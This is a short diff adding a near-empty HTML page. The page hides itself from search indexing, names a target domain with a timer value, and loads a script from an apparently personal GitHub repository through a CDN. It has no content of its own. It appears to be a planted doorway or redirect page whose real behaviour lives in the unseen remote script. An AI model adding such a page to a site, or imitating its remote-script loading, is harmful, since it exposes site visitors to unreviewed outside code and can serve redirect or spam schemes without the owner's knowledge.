@@ -1,0 +1,1 @@
+<!doctype html><html><head><meta name="robots" content="noindex, follow"><script type="text/javascript">var maindomain = 'ekoloko.co.il'; var maintime = 14400;</script></head><body><script src="https://cdn.jsdelivr.net/gh/proginter/some@3400c41/get.js"></script><div></div></body></html>
